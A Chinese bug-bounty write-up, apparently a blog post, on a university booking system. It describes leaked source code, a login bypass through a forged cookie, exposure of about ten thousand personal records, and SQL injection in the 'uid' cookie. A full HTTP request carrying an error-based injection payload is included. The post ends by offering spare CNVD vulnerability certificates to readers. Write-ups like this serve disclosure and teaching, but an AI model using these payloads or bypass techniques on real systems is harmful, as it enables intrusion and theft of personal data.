#  EDUSRC证书站之源码泄露导致的10rank漏洞  
原创 安全小生
                    安全小生  安全小生   2026-04-22 15:26  
  
前言:以及停更几个月了，于是有点手痒就写下这篇文章，此次站点是从微信端抓取的链接，用浏览器访问的后台链接，从而得到的一系列漏洞  
  
  
0x1代码审计突破登录口  
  
首先面对的是一个登录框 这里放不了 因为现在系统以及下架了 找不到登录框了（就放张表情包意思一下）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MIgO9EvXaujb5FibC2GE0o7ibEHRM92DHVHCyVcoLH4rSZKBpW8uEDdMtcoE8JUb7x5KsO7Nnz9sDYWuzslLVLyYBKcW9C30GbVrn1EZd8bVs/640?wx_fmt=png&from=appmsg "")  
  
弱口令尝试无果后 扫描一下后台路径 发现泄露了网站源码，都有源码了，这还说啥呢，直接开审  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MIgO9EvXauiazHCa8nRMX8SRvlQgJqXY1yq2uGsHd46SLcfcWz6bF8Hrr3y4miayNOBibZMDnhWVqRKH1IPicibseib5xVbwfoOWClheTa2Rq8DU8/640?wx_fmt=jpeg&from=appmsg "")  
  
审到此处发现可以构造cookie绕过密码验证登入后台 并且发现此次cookie存在cookie注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MIgO9EvXaujuIANQNMiaDHWoSrH6VeKjaWibuawWHQwzNZr7Fib0dibmGOMjpkZX67vAvdBKOBuSDb9zIJ0R3KshAVesicer0SmoSVW3K0nxxOO8/640?wx_fmt=png&from=appmsg "")  
  
  
0x2敏感信息泄露  
  
这个系统是某大学的预约系统 故会有大量敏感信息泄露 这里泄露了近一万信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MIgO9EvXauiaNP2Hap7GiaZ3h7kzqzic0NrMnwzsrnDIl7wqF5IfcVUbKL81PwEXa4560133qz8QibxuqVwu2q0NSXzZiakicp2y4JrepeB8wialBk/640?wx_fmt=png&from=appmsg "")  
  
0x3多处sql注入  
  
总而言之有着源码，这个老网站对于我来说，也可称之为千疮百孔了  
  
cookie注入还是挺少见的 所以这里就稍微展示一下  
  
观察下面的cookie uid=1    
```
POST /admin/xxxx.php?act=save HTTP/1.1
Host:
Content-Length: 69
Cache-Control: max-age=0
Origin: 
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: 
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: mvcode=c5hg; uName=admin; uid=1; PHPSESSID=lhr5oe0lohqrdrfi3pgocn3jr1
Connection: keep-alive

```  
  
其实看到这处敏感点的师傅 都会忍不住的取给它插个单引号吧  
```
POST /admin/xxxx.php?act=save HTTP/1.1
Host:
Content-Length: 69
Cache-Control: max-age=0
Origin: 
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: 
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: mvcode=c5hg; uName=admin; uid=1+and+extractvalue(1,concat(0x7e,database(),0x7e))--+; PHPSESSID=lhr5oe0lohqrdrfi3pgocn3jr1
Connection: keep-alive
```  
  
得以爆出数据库名称‘ticxxet’  
  
其他的sql注入就不过多讲述了 师傅们就算没源码进了后台 那也是手到擒来的  
  
因为封顶就10rank 所以只拿了十rank 那会没想着分开交 也是错失一笔rank  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MIgO9EvXauhaQjZicPrzKdvDRtgsAPe4dAbTA6ElqlmWP4ibMwueNzVGvuPkpHwJzjcpL72nVYtarjluPv9cr51xMqvDJLJ5Vv1ibrdxvr36Nk/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
最后再提一嘴 小生我最近搞了不少cnvd证书，手上还剩几本多余的，有需要的私我  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MIgO9EvXauhvnvVQ1td3AbLDJriaiauwujuTTh9lVCVKnGicuJDtRNgscvwBVU4WXibcZukdjvYSbX5s8ibsiabS7wEB9ibxtsDwZ5xf4PlMZUNEkg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
